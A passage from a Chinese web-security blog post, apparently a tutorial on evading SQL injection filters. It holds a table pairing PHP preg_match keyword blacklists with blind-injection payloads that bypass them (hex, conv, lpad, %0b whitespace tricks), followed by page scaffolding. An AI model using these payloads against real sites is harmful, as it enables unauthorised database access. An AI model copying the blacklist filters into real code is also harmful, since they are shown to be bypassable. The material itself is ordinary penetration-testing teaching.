&#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16))&#x2F;td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)&#x2F;td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># Web安全&渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html" rel="next" title="SQL注入Fuzz记录">
+                <i class="fa fa-chevron-left"></i> SQL注入Fuzz记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODUyMy8yNTAxNw=="></div>
+    </div>
+
+  
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/3.jpg"
+                alt="Da4er's" />
+            
+              <p class="site-author-name" itemprop="name">Da4er's</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Da4er" target="_blank" title="Github">
+                      
+                        <i class="fa fa-fw fa-github"></i>Github</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:446675191@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/da4er" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/wangtanzhi/" title="叹之师傅's Blogs" target="_blank">叹之师傅's Blogs</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-数据库特性"><span class="nav-number">1.</span> <span class="nav-text">0x01 数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#注释"><span class="nav-number">1.1.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sql函数和关键字"><span class="nav-number">1.2.</span> <span class="nav-text">sql函数和关键字</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-绕过过滤"><span class="nav-number">2.</span> <span class="nav-text">0x02 绕过过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#大小写绕过"><span class="nav-number">2.1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内联注释"><span class="nav-number">2.2.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码绕过"><span class="nav-number">2.3.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格绕过"><span class="nav-number">2.4.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#等价函数绕过"><span class="nav-number">2.5.</span> <span class="nav-text">等价函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#特殊函数绕过"><span class="nav-number">2.6.</span> <span class="nav-text">特殊函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP一些常见的过滤方法及绕过方式"><span class="nav-number">2.7.</span> <span class="nav-text">PHP一些常见的过滤方法及绕过方式</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">40.1k</span>
+  
+</div>
+
+
+  <span class="post-meta-divider">Da4er</span>
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共40.1k字</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("YHuuXLqrx0nITmy4AEuRQzFI-gzGzoHsz", "y6n52o0LtOdvVhJ6PYpX2jkg");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
